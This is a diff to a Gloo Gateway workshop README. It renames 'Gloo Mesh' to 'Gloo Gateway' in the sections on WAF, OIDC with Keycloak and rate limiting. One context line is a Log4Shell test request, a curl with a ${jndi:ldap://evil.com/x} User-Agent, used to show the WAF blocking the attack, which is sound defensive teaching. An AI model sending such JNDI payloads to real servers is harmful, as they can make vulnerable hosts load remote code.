@@ -46,7 +46,7 @@ cd solo-cop/workshops/gloo-gateway && git checkout v1.1.0
 Set these environment variables which will be used throughout the workshop.
 
 ```sh
-# Used to enable Gloo Mesh (please ask for a trail license key)
+# Used to enable Gloo Gateway (please ask for a trail license key)
 export GLOO_GATEWAY_LICENSE_KEY=<licence_key>
 export GLOO_PLATFORM_VERSION=v2.1.0-beta13
 
@@ -471,7 +471,7 @@ curl -v $GLOO_GATEWAY/httpbin/get
 
 ![Security](images/security.png)
 
-Gloo Mesh Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
+Gloo Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
 
 In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
 
@@ -484,7 +484,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
 ```
 
-3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
+3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
 
 * In the route table, the frontend route has the label `route: httpbin`. The WAF policy applies to routes with this same label.
 * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
@@ -716,7 +716,7 @@ grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --plaintext --proto ./install
 
 ![Keycloak](images/keycloak.png)
 
-Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
+Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
 
 1. In order for OIDC to work we need to enable HTTPS on our gateway. For this demo, we will create and upload a self-signed certificate which will be used in the gateway for TLS termination.
 
@@ -802,7 +802,7 @@ And the application is now accessible.
 
 ![Rate Limiting](images/rate-limiter.png)
 
-Secondly, we will look at rate limiting with Gloo Mesh Gateway.  The rate limiting feature relies on a rate limit server that has been installed in our gloo-mesh-addons namespace.
+Secondly, we will look at rate limiting with Gloo Gateway.  The rate limiting feature relies on a rate limit server that has been installed in our gloo-mesh-addons namespace.
 
 For rate limiting, we need to create three CRs.  Let's start with the `RateLimitClientConfig`.
 
